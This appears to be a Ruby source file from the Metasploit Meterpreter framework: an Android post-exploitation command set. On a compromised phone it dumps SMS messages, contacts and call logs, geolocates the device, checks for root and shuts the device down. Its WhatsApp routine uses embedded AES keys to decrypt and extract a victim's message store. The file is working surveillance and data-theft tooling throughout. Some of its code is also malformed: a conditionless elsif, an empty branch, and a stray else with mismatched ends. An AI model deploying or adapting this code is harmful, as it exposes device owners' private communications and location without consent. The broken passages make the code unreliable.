# -*- coding: binary -*-
require 'rex/post/meterpreter'
require 'sqlite3'
require 'date'

module Rex
module Post
module Meterpreter
module Ui

###
# Android extension - set of commands to be executed on android devices.
# extension by Anwar Mohamed (@anwarelmakrahy)
###

class Console::CommandDispatcher::Android

  Klass = Console::CommandDispatcher::Android
  include Console::CommandDispatcher

  def initialize(shell)
    super
  end

  #
  # List of supported commands.
  #
 def commands
    all = {
      "check_root"        => "Check if device is rooted",
      "device_shutdown"   => "Shutdown device",
      "dump_calllog"      => "Get call log",
      "dump_contacts"     => "Get contacts list",
      "dump_sms"          => "Get sms messages",
      "dump_whatsapp"     => "Get whatsapp contacts and messages",
      "geolocate"         => "Get current lat-long using geolocation"

    }

    reqs = {
      "dump_sms"   		  => [ "dump_sms" ],
      "dump_contacts"   => [ "dump_contacts"],
      "geolocate"   	  => [ "geolocate"],
      "dump_calllog"    => [ "dump_calllog"],
      "dump_whatsapp"   => [ "dump_whatsapp"],
      "check_root"      => [ "check_root"],
      "device_shutdown" => [ "device_shutdown"]
    }

    all.delete_if do |cmd, desc|
      del = false
      reqs[cmd].each do |req|
        next if client.commands.include? req
        del = true
        break
      end

      del
    end

    all
  end

  def cmd_device_shutdown(*args)

    seconds = 0
    device_shutdown_opts = Rex::Parser::Arguments.new(
      "-h" => [ false, "Help Banner" ],
      "-t" => [ false, "Shutdown after n seconds"]
    )

    device_shutdown_opts.parse( args ) { | opt, idx, val |
      case opt
      when "-h"
        print_line( "Usage: device_shutdown [options]\n" )
        print_line( "Shutdown device." )
        print_line( device_shutdown_opts.usage )
        return
      when "-t"
        seconds = val
      end
    }

    res = client.android.device_shutdown(seconds)

    if res == true
      print_status("Device will shutdown #{seconds > 0 ?("after " + seconds + "seconds"):"now"}")
    else
      print_error("Device shutdown failed")
    end
  end
  
  def cmd_dump_sms(*args)

    path    = "sms_dump_" + Rex::Text.rand_text_alpha(8) + ".txt"
    dump_sms_opts = Rex::Parser::Arguments.new(
      "-h" => [ false, "Help Banner" ],
      "-o" => [ false, "Output path for sms list"]
      )

    dump_sms_opts.parse( args ) { | opt, idx, val |
      case opt
      when "-h"
        print_line( "Usage: dump_sms [options]\n" )
        print_line( "Get sms messages." )
        print_line( dump_sms_opts.usage )
        return
      when "-o"
        path = val
      end
    }

    smsList = Array.new
    smsList = client.android.dump_sms

    if smsList.count > 0
      print_status( "Fetching #{smsList.count} sms #{smsList.count == 1? 'message': 'messages'}" )
      begin
        info = client.sys.config.sysinfo

        ::File.open( path, 'wb' ) do |fd|

          fd.write("\n=====================\n")
          fd.write("[+] Sms messages dump\n")
          fd.write("=====================\n\n")

          time = Time.new
          fd.write("Date: #{time.inspect}\n")
          fd.write("OS: #{info['OS']}\n")
          fd.write("Remote IP: #{client.sock.peerhost}\n")
          fd.write("Remote Port: #{client.sock.peerport}\n\n")

          smsList.each_with_index { |a, index|

              fd.write("##{(index.to_i + 1).to_s()}\n")

              type = "Unknown"
              if a['type'] == "1"
                type = "Incoming"
              elsif a['type'] == "2"
                type = "Outgoing"
              end

              status = "Unknown"
              if a['status'] == "-1"
                status = "NOT_RECEIVED"
              elsif a['status'] == "1"
                status = "SME_UNABLE_TO_CONFIRM"
              elsif a['status'] == "0"
                status = "SUCCESS"
              elsif a['status'] == "64"
                status = "MASK_PERMANENT_ERROR"
              elsif a['status'] == "32"
                status = "MASK_TEMPORARY_ERROR"
              elsif a['status'] == "2"
                status = "SMS_REPLACED_BY_SC"
              end

              fd.write("Type\t: #{type}\n")

              time = a['date'].to_i / 1000
              time = Time.at(time)

              fd.write("Date\t: #{time.strftime("%Y-%m-%d %H:%M:%S")}\n")
              fd.write("Address\t: #{a['address']}\n")
              fd.write("Status\t: #{status}\n")
              fd.write("Message\t: #{a['body']}\n\n")
          }
        end

        path = ::File.expand_path( path )

        print_status( "Sms #{smsList.count == 1? 'message': 'messages'} saved to: #{path}" )
        Rex::Compat.open_file( path )

        return true
      rescue
        print_error("Error getting messages")
        return false
      end
    else
      print_status( "No sms messages were found!" )
      return false
    end
  end


  def cmd_dump_contacts(*args)

    path    = "contacts_dump_" + Rex::Text.rand_text_alpha(8) + ".txt"
    dump_contacts_opts = Rex::Parser::Arguments.new(

      "-h" => [ false, "Help Banner" ],
      "-o" => [ false, "Output path for contacts list"]

      )

    dump_contacts_opts.parse( args ) { | opt, idx, val |
      case opt
      when "-h"
        print_line( "Usage: dump_contacts [options]\n" )
        print_line( "Get contacts list." )
        print_line( dump_contacts_opts.usage )
        return
      when "-o"
        path = val
      end
    }

    contactList = Array.new
    contactList = client.android.dump_contacts

    if contactList.count > 0
      print_status( "Fetching #{contactList.count} #{contactList.count == 1? 'contact': 'contacts'} into list" )
      begin
        info = client.sys.config.sysinfo

        ::File.open( path, 'wb' ) do |fd|

          fd.write("\n======================\n")
          fd.write("[+] Contacts list dump\n")
          fd.write("======================\n\n")

          time = Time.new
          fd.write("Date: #{time.inspect}\n")
          fd.write("OS: #{info['OS']}\n")
          fd.write("Remote IP: #{client.sock.peerhost}\n")
          fd.write("Remote Port: #{client.sock.peerport}\n\n")

          contactList.each_with_index { |c, index|

              fd.write("##{(index.to_i + 1).to_s()}\n")
              fd.write("Name\t: #{c['name']}\n")

              if c['number'].count > 0
                (c['number']).each { |n|
                  fd.write("Number\t: #{n}\n")
                }
              end

              if c['email'].count > 0
                (c['email']).each { |n|
                  fd.write("Email\t: #{n}\n")
                }
              end

              fd.write("\n")
          }
        end

        path = ::File.expand_path( path )
        print_status( "Contacts list saved to: #{path}" )
        Rex::Compat.open_file( path )

        return true
      rescue
        print_error("Error getting contacts list")
        return false
      end
    else
      print_status( "No contacts were found!" )
      return false
    end
  end

  def cmd_geolocate(*args)

    generate_map = false
    geolocate_opts = Rex::Parser::Arguments.new(

      "-h" => [ false, "Help Banner" ],
      "-g" => [ false, "Generate map using google-maps"]

      )

    geolocate_opts.parse( args ) { | opt, idx, val |
      case opt
      when "-h"
        print_line( "Usage: geolocate [options]\n" )
        print_line( "Get current location using geolocation." )
        print_line( geolocate_opts.usage )
        return
      when "-g"
        generate_map = true
      end
    }

    geo = client.android.geolocate

    print_status("Current Location:\n")
    print_line("\tLatitude  : #{geo[0]['lat']}")
    print_line("\tLongitude : #{geo[0]['long']}\n")
    print_line("To get the address: https://maps.googleapis.com/maps/api/geocode/json?latlng=#{geo[0]['lat']},#{geo[0]['long']}&sensor=true\n")


    if generate_map
      link = "https://maps.google.com/maps?q=#{geo[0]['lat']},#{geo[0]['long']}"
      print_status("Generated map on google-maps:")
      print_status("#{link}")
      Rex::Compat.open_browser(link)
    end

  end

  def cmd_dump_calllog(*args)

    path = "dump_calllog_" + Rex::Text.rand_text_alpha(8) + ".txt"
    dump_calllog_opts = Rex::Parser::Arguments.new(

      "-h" => [ false, "Help Banner" ],
      "-o" => [ false, "Output path for call log"]

      )

    dump_calllog_opts.parse( args ) { | opt, idx, val |
      case opt
      when "-h"
        print_line( "Usage: dump_calllog [options]\n" )
        print_line( "Get call log." )
        print_line( dump_calllog_opts.usage )
        return
      when "-o"
        path = val
      end
    }

    log = Array.new
    log = client.android.dump_calllog

    if log.count > 0
      print_status( "Fetching #{log.count} #{log.count == 1? 'entry': 'entries'}" )
      begin
        info = client.sys.config.sysinfo

        ::File.open( path, 'wb' ) do |fd|

          fd.write("\n=================\n")
          fd.write("[+] Call log dump\n")
          fd.write("=================\n\n")

          time = Time.new
          fd.write("Date: #{time.inspect}\n")
          fd.write("OS: #{info['OS']}\n")
          fd.write("Remote IP: #{client.sock.peerhost}\n")
          fd.write("Remote Port: #{client.sock.peerport}\n\n")

          log.each_with_index { |a, index|

              fd.write("##{(index.to_i + 1).to_s()}\n")

              fd.write("Number\t: #{a['number']}\n")
              fd.write("Name\t: #{a['name']}\n")
              fd.write("Date\t: #{a['date']}\n")
              fd.write("Type\t: #{a['type']}\n")
              fd.write("Duration: #{a['duration']}\n\n")
          }
        end

        path = ::File.expand_path( path )
        print_status( "Call log saved to: #{path}" )
        Rex::Compat.open_file( path )

        return true
      rescue
        print_error("Error getting call log")
        return false
      end
    else
      print_status( "No call log entries were found!" )
      return false
    end
  end


  def cmd_check_root(*args)

    check_root_opts = Rex::Parser::Arguments.new(
      "-h" => [ false, "Help Banner" ]
      )

    check_root_opts.parse( args ) { | opt, idx, val |
      case opt
      when "-h"
        print_line( "Usage: check_root [options]\n" )
        print_line( "Check if device is rooted." )
        print_line( check_root_opts.usage )
        return
      end
    }

    isRooted = client.android.check_root

    if isRooted == true
      print_status("Device is rooted")
    elsif
      print_status("Device is not rooted")
    end
  end

  def cmd_dump_whatsapp(*args)
    
    enumerate = false
    enumpp = false
    enummedia = false
    getpp = false
    getpp_index = 0
    getmedia = false
    getmedia_index = 0
    getmedia_type = String.new
    extractmsg = false
    output = false
    local = false
    
    dump_whatsapp_opts = Rex::Parser::Arguments.new(
      "-h" => [ false, "Help Banner" ],
      "-e" => [ false, "Enumerate available dumps"],
      "-d" => [ false, "Dump whatsapp msgstore"],
      "-x" => [ false, "Extract conversations from msgstore"],
      "-p" => [ true,  "Get profile picture for specific contact"],
      "-o" => [ true,  "Save output to file" ],
      "-r" => [ false, "Get list of available profile pictures"],
      "-m" => [ false, "Get list of media files available"],
      "-n" => [ true,  "Get media file by index, specified with type -t"],
      "-t" => [ true,  "Set type of media file [image|video|voice|audio]"],
      "-i" => [ true,  "Extract conversations from local msgstore.db"]
      )

    dump_whatsapp_opts.parse( args ) { | opt, idx, val |
      case opt
      when "-h"
        print_line( "Usage: dump_whatsapp [options]\n" )
        print_line( "Get whatsapp contacts ,messages and media." )
        print_line( dump_whatsapp_opts.usage )
        return
      when "-e"
        enumerate = true
      when "-r"
        enumpp = true
      when "-m"
        enummedia = true
      when "-p"
        getpp = true
        getpp_index = val.to_i
      when "-n"
        getmedia = true
        getmedia_index = val.to_i
      when "-t"
        getmedia_type = val.to_s
      when "-x"
        extractmsg = true
      when "-o"
        output_path = val
        output = true
      when "-i"
        local = true
        local_path = val
      end
    } 

    if (enumerate)
      print_status("Enumerating available dumps")
      enums = client.android.dump_whatsapp_enum

      print_status
      print_line  "    MessageDb: #{enums['msgstore']}"
      print_line  "       Images: #{enums['image']}"
      print_line  "       Videos: #{enums['video']}"
      print_line  "        Voice: #{enums['voice']}"
      print_line  "        Audio: #{enums['audio']}"
      print_line  "     Profiles: #{enums['profile']}"
      print_line
      return
    end

    if (enumpp)
      print_status("Getting a list of available profile pictures")
      enums = client.android.dump_whatsapp_enum_pp

      print_status
      print_line "    File Name"
      print_line "    ========="
      enums.each_with_index { |a, index|
        print_line "    #{index + 1} #{a}"
      }
      print_line
      return
    end

    if (enummedia)
      print_status("Getting a list of available media files")
      enums = client.android.dump_whatsapp_enum_media

      print_status
      enums.each { |a|
        print_line "    #{a['type']}"
        print_line "    " + '=' * a['type'].length

        a['array'].each_with_index { |arr, index| 
          print_line "    #{index + 1} #{arr}"
        }

        print_line
      }
      return
    end

    if (getpp)
      print_status("Getting profile picture of index #{getpp_index.to_s}")
      image = client.android.dump_whatsapp_get_media("profile", getpp_index-1)

      if(image and image['raw'] and image['raw'].length > 0)
        path = "dump_whatsapp_" + image['filename']
        save_and_open(image['raw'], path)
        print_line("Profile picture saved to: #{::File.expand_path(path)}")
 
      else
        print_error("Failed to get profile picture, check your specified index")
      end
      return
    end

    if (getmedia)
      print_status("Getting media file of index #{getmedia_index.to_s}")
      media = client.android.dump_whatsapp_get_media(getmedia_type, getmedia_index-1)

      if(media and media['raw'] and media['raw'].length > 0)
        path = "dump_whatsapp_" + media['filename']
        save_and_open(media['raw'], path)
        print_line("Media file saved to: #{::File.expand_path(path)}")
 
      else
        print_error("Failed to get media, check your specified media type [-t]")
      end
      return
    end


    print_status("Dumping whatsapp local msgstore")
     
    if (local)
      path = local_path
    else
      msgstore = client.android.dump_whatsapp
      path = 'dump_whatsapp_msgstore.db'

      if (msgstore['raw'])

        # check if crypt or crypt5
        if (msgstore['metadata'].split(':')[0] == 'crypt')

          print_status("Decrypting crypt msgstore")
          cipher = OpenSSL::Cipher::AES192.new(:ECB)
          cipher.decrypt
          cipher.key = "346a23652a46392b4d73257c67317e352e3372482177652c".scan(/../).map(&:hex).map(&:chr).join

          ::File.open(path, 'wb') { |file| file.write(cipher.update(msgstore['raw']) + cipher.final) }

        else
          print_status("Decrypting crypt5 msgstore")

          key = [141, 75, 21, 92, 201, 255, 129, 229, 203, 246, 250, 120, 25, 54, 106, 62, 198, 33, 166, 86, 65, 108, 215, 147]
          iv  = [0x1E,0x39,0xF3,0x69,0xE9,0xD,0xB3,0x3A,0xA7,0x3B,0x44,0x2B,0xBB,0xB6,0xB0,0xB9]

          cipher = OpenSSL::Cipher::AES192.new(:ECB)
          cipher.decrypt

          md5 = OpenSSL::Digest::MD5.new
          md5 = md5.digest(msgstore['metadata'].split(':')[1]).bytes
          (0...24).each { |i| key[i] ^= md5[i&0xF] }
          cipher.key = key
          cipher.iv = iv

          ::File.open(path, 'wb') { |file| file.write(cipher.update(msgstore['raw']) + cipher.final) }
        end

        print_status("Decrypted msgstore saved to #{::File.expand_path(path)}")
      end
    end

    begin
      db = SQLite3::Database.open path
      messages = db.prepare("SELECT Count(*) FROM messages").execute
      chat_list = db.prepare("SELECT Count(*) FROM chat_list").execute
      print_status("Got #{messages.first[0]} messages, #{chat_list.first[0]} conversations") 
    rescue SQLite3::Exception => e    
      print_error("Error getting data from database")
    ensure
      chat_list.close if chat_list
      messages.close if messages
      db.close if db
    end

    if (extractmsg)
      chat_sessions = Array.new  
      print_status("Extracting chat conversations")

      begin 
        db = SQLite3::Database.open path

        begin                            
          chats = db.prepare("SELECT * FROM chat_list").execute

          # chat[0] --> _id (primary key)
          # chat[1] --> key_remote_jid (contact jid or group chat jid)
          # chat[2] --> message_table_id (id of last message in this chat, corresponds to table messages primary key)
          
          while (chat = chats.next) do

              begin
                tmp = db.prepare("SELECT timestamp FROM messages WHERE _id=?").bind_param(1, chat[2]).execute
                lastmessagedate = tmp.fetchone()[0]       
              rescue
                lastmessagedate = nil
              ensure
                tmp.close if tmp
              end

              chat_sessions <<
              {
                'primary'   => chat[0],
                'nickname'  => chat[1].split('@')[0],
                'id'        => chat[1],
                'count'     => nil,
                'status'    => nil,
                'unread'    => nil,
                'lastdate'  => lastmessagedate,
                'list'      => Array.new
              }

          end

        rescue SQLite3::Exception => e    
          print_error("Error getting data from database")
        ensure
          chats.close if chats
        end

        chat_sessions.each { |chat|
          begin
            msgs = db.prepare("SELECT * FROM messages WHERE key_remote_jid='#{chat['id']}' ORDER BY _id ASC;").execute

            # msg[0] --> _id (primary key)
            # msg[1] --> key_remote_jid
            # msg[2] --> key_from_me
            # msg[3] --> key_id
            # msg[4] --> status
            # msg[5] --> needs_push
            # msg[6] --> data
            # msg[7] --> timestamp
            # msg[8] --> media_url
            # msg[9] --> media_mime_type
            # msg[10] -> media_wa_type
            # msg[11] -> media_size
            # msg[12] -> media_name
            # msg[13] -> latitude
            # msg[14] -> longitude
            # msg[15] -> thumb_image
            # msg[16] -> remote_resource
            # msg[17] -> received_timestamp
            # msg[18] -> send_timestamp
            # msg[19] -> receipt_server_timestamp
            # msg[20] -> receipt_device_timestamp

            while (msg = msgs.next) do
              message = Hash.new

              if (!msg[16] or msg[16].length == 0)
                message['from'] = msg[1]
              else
                message['from'] = msg[16]
              end

              if (msg[2] == 1)
                message['from'] = 'me'
              end

              message['thumbnaildata']  = msg[21]
              message['id']             = msg[0]
              message['timestamp']      = msg[7]
              message['data']           = msg[6]
              message['status']         = msg[4]
              message['media_name']     = msg[12]
              message['media_url']      = msg[8]
              message['media_wa_type']  = msg[10]
              message['media_size']     = msg[11]
              message['latitude']       = msg[13]
              message['longitude']      = msg[14]

              chat['list'] << message
            end

          rescue SQLite3::Exception => e    
            print_error("Error getting data from database") 
          ensure
            msgs.close if msgs
          end
        }

      rescue SQLite3::Exception => e    
        print_error("Error getting data from database")  
      ensure
        db.close if db
      end

      print_status
      chat_sessions.each_with_index {|chat, index|
        chat['count'] = chat['list'].count
        header = "    ##{index+1} id: #{chat['nickname']} - count: #{chat['count']}"
        print_line(header)
        print_line('    ' + '-' * (header.length - 4))

        chat['list'].each_with_index {|msg, index |
          print_line('    ' + (msg['from'] == 'me' ? '<== ':'==> ') + "#{DateTime.strptime(msg['timestamp'].to_s[0..-4],'%s').strftime('%d-%m-%Y %H:%M')} | " + (msg['data'] ? msg['data'] : '<NONE>'))
        }

        print_line
      }
      print_line

      if (output)
      else
      end

    end
    print_status("Whatsapp was dumped successfully")
    else
      print_error("Couldn't dump whatsapp msgstore")
    end   
  end

  def save_and_open(data, path)
    ::File.open(path, 'wb') do |fd|
      fd.write(data)
    end
    path = ::File.expand_path(path)
    Rex::Compat.open_file(path)
  end

  #
  # Name for this dispatcher
  #
  def name
    "Android"
  end

end

end
end
end
end